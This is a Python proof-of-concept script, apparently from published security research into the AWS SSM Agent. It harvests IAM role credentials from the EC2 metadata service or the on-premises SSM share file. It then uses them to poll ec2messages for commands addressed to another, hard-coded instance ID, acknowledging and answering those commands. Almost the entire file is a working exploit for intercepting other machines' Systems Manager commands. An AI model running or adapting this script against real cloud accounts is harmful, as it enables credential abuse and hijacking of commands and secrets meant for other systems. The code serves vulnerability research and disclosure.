#!/usr/bin/env python3
# Example described at https://frichetten.com/blog/ssm-agent-tomfoolery/
# https://github.com/Frichetten/ssm-agent-research/tree/main/ssm-session-interception

import requests, json, uuid, configparser, socket
import aws_requests

def retrieve_meta() -> json:
    resp = requests.get("http://169.254.169.254/latest/dynamic/instance-identity/document")
    return json.loads(resp.text)


def retrieve_role_name() -> str:
    resp = requests.get("http://169.254.169.254/latest/meta-data/iam/security-credentials/")
    return resp.text


def retrieve_hostname() -> str:
    resp = requests.get("http://169.254.169.254/latest/meta-data/local-hostname/")
    return resp.text


def retrieve_ipv4() -> str:
    resp = requests.get("http://169.254.169.254/latest/meta-data/local-ipv4/")
    return resp.text


def retrieve_role_creds(role_name) -> dict:
    headers = { "X-Aws-Ec2-Metadata-Token-Ttl-Seconds": "21600" }
    resp = requests.put("http://169.254.169.254/latest/api/token", headers=headers)
    api_token = resp.text

    headers = { "X-Aws-Ec2-Metadata-Token": api_token }
    resp = requests.get("http://169.254.169.254/latest/meta-data/iam/security-credentials/"+role_name, headers=headers)
    return json.loads(resp.text)

def retrieve_hybrid_creds(credentials_path) -> dict:
    config = configparser.ConfigParser()
    config.read(credentials_path)
    creds = config['default']
    return dict(AccessKeyId = creds['aws_access_key_id'], SecretAccessKey = creds['aws_secret_access_key'], Token = creds['aws_session_token'])

# Check to see if we're OnPrem or EC2
identity_config = json.load(open('C:\\ProgramData\\Amazon\\SSM\\runtimeconfig\\identity_config.json'))
if identity_config['IdentityType'] == 'EC2':
    # Get role name and creds
    meta = retrieve_meta()
    instanceId = meta['instanceId']
    role_name = retrieve_role_name()
    role_creds = retrieve_role_creds(role_name)
    hostname = retrieve_hostname()
    ipv4 = retrieve_ipv4()
elif identity_config['IdentityType'] == 'OnPrem':
    instanceId = identity_config['InstanceId']
    role_creds = retrieve_hybrid_creds(identity_config['ShareFile'])
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    hostname = socket.gethostname()
    ipv4 = socket.gethostbyname(hostname)
else:
    raise 'Unable to determine instance type.'

# Need to tell ssm who we are - The native client may already do this, but we might as well
aws_requests.update_instance_information(
        hostname,
        ipv4,
        instanceId,
        role_creds['AccessKeyId'],
        role_creds['SecretAccessKey'],
        role_creds['Token']
        )

# Attempt to fetch messages intended for another instance
instanceId = 'i-027618be423f6c9d2'

# Bother ec2messages to get commands for send-command
while True:
    message_id = ""
    command_payload = ""
    while command_payload == "":
        message_id = str(uuid.uuid4())
        command_payload = aws_requests.get_messages(
                instanceId, 
                message_id, 
                role_creds['AccessKeyId'], 
                role_creds['SecretAccessKey'], 
                role_creds['Token']
                )

    # print the command
    print("Command:", command_payload['Parameters']['commands'])
    command_id = command_payload['CommandId']

    # Get acknowledge message
    aws_requests.acknowledge_message(instanceId, command_id, role_creds['AccessKeyId'], role_creds['SecretAccessKey'], role_creds['Token'])
    aws_requests.send_reply(instanceId, command_id, role_creds['AccessKeyId'], role_creds['SecretAccessKey'], role_creds['Token'])